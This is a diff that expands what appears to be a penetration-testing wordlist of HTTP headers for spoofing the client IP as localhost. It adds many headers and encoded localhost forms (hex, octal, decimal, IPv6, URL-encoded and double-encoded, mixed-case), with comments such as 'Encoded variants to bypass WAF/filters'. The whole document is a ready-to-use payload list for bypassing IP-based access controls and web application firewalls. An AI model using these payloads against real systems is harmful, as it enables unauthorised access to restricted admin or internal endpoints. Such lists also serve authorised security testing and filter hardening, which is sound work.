@@ -1,42 +1,109 @@
- Base-Url: 127.0.0.1
- Client-IP: 127.0.0.1
- Http-Url: 127.0.0.1
- Proxy-Host: 127.0.0.1
- Proxy-Url: 127.0.0.1
- Real-Ip: 127.0.0.1
- Redirect: 127.0.0.1
- Referer: 127.0.0.1
- Referrer: 127.0.0.1
- Refferer: 127.0.0.1
- Request-Uri: 127.0.0.1
- Uri: 127.0.0.1
- Url: 127.0.0.1
- X-Client-IP: 127.0.0.1
- X-Custom-IP-Authorization: 127.0.0.1
- X-Forward-For: 127.0.0.1
- X-Forwarded-By: 127.0.0.1
- X-Forwarded-For-Original: 127.0.0.1
- X-Forwarded-For: 127.0.0.1
- X-Forwarded-Host: 127.0.0.1
- X-Forwarded-Port: 443
- X-Forwarded-Port: 4443
- X-Forwarded-Port: 80
- X-Forwarded-Port: 8080
- X-Forwarded-Port: 8443
- X-Forwarded-Scheme: http
- X-Forwarded-Scheme: https
- X-Forwarded-Server: 127.0.0.1
- X-Forwarded: 127.0.0.1
- X-Forwarder-For: 127.0.0.1
- X-Host: 127.0.0.1
- X-Http-Destinationurl: 127.0.0.1
- X-Http-Host-Override: 127.0.0.1
- X-Original-Remote-Addr: 127.0.0.1
- X-Original-Url: 127.0.0.1
- X-Originating-IP: 127.0.0.1
- X-Proxy-Url: 127.0.0.1
- X-Real-Ip: 127.0.0.1
- X-Remote-Addr: 127.0.0.1
- X-Remote-IP: 127.0.0.1
- X-Rewrite-Url: 127.0.0.1
- X-True-IP: 127.0.0.1
+Base-Url: 127.0.0.1
+Client-IP: 127.0.0.1
+Http-Url: 127.0.0.1
+Proxy-Host: 127.0.0.1
+Proxy-Url: 127.0.0.1
+Real-Ip: 127.0.0.1
+Redirect: 127.0.0.1
+Referer: 127.0.0.1
+Referrer: 127.0.0.1
+Refferer: 127.0.0.1
+Request-Uri: 127.0.0.1
+Uri: 127.0.0.1
+Url: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forward-For: 127.0.0.1
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Port: 443
+X-Forwarded-Port: 4443
+X-Forwarded-Port: 80
+X-Forwarded-Port: 8080
+X-Forwarded-Port: 8443
+X-Forwarded-Scheme: http
+X-Forwarded-Scheme: https
+X-Forwarded-Server: 127.0.0.1
+X-Forwarded: 127.0.0.1
+X-Forwarder-For: 127.0.0.1
+X-Host: 127.0.0.1
+X-Http-Destinationurl: 127.0.0.1
+X-Http-Host-Override: 127.0.0.1
+X-Original-Remote-Addr: 127.0.0.1
+X-Original-Url: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Proxy-Url: 127.0.0.1
+X-Real-Ip: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Rewrite-Url: 127.0.0.1
+X-True-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+Via: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded: for=127.0.0.1
+X-WAP-Profile: 127.0.0.1
+Profile: 127.0.0.1
+Contact: 127.0.0.1
+X-Device-User-Agent: 127.0.0.1
+X-Forwarded-Proto: https
+X-Original-Host: 127.0.0.1
+X-ProxyContextPath: 127.0.0.1
+X-Authenticated-User: 127.0.0.1
+
+# Encoded variants to bypass WAF/filters
+X-Forwarded-For: 127.1
+X-Forwarded-For: 2130706433
+X-Forwarded-For: 0x7f.0x0.0x0.0x1
+X-Forwarded-For: 0177.0000.0000.0001
+X-Forwarded-For: 0x7f000001
+X-Forwarded-For: 017700000001
+X-Forwarded-For: 127.0.1
+X-Forwarded-For: 127.1.0.1
+X-Forwarded-For: 0.0.0.0
+X-Forwarded-For: 0177.01
+X-Forwarded-For: 0x0.0x0.0x0.0x0
+X-Real-IP: 127.1
+X-Real-IP: 2130706433
+X-Real-IP: 0x7f.0x0.0x0.0x1
+X-Real-IP: 0177.0000.0000.0001
+Client-IP: 127.1
+Client-IP: 2130706433
+Client-IP: 0x7f000001
+
+# IPv6 localhost variants
+X-Forwarded-For: ::1
+X-Forwarded-For: 0000:0000:0000:0000:0000:0000:0000:0001
+X-Forwarded-For: ::ffff:127.0.0.1
+X-Real-IP: ::1
+Client-IP: ::1
+
+# URL encoded
+X-Forwarded-For: %31%32%37%2e%30%2e%30%2e%31
+X-Real-IP: %31%32%37%2e%30%2e%30%2e%31
+
+# Double URL encoded
+X-Forwarded-For: %2531%2532%2537%252e%2530%252e%2530%252e%2531
+
+# Alternative localhost representations
+X-Forwarded-For: localhost
+X-Forwarded-For: localtest.me
+X-Real-IP: localhost
+Client-IP: localhost
+
+# Mixed case to bypass case-sensitive filters
+x-forwarded-for: 127.0.0.1
+X-FORWARDED-FOR: 127.0.0.1
+x-real-ip: 127.0.0.1
+X-REAL-IP: 127.0.0.1
+
+# With additional obfuscation
+X-Forwarded-For: 127.0.0.1:80
+X-Forwarded-For: 127.0.0.1:443
+X-Forwarded-For: 127.0.0.1, 192.168.1.1
+X-Forwarded-For: 192.168.1.1, 127.0.0.1
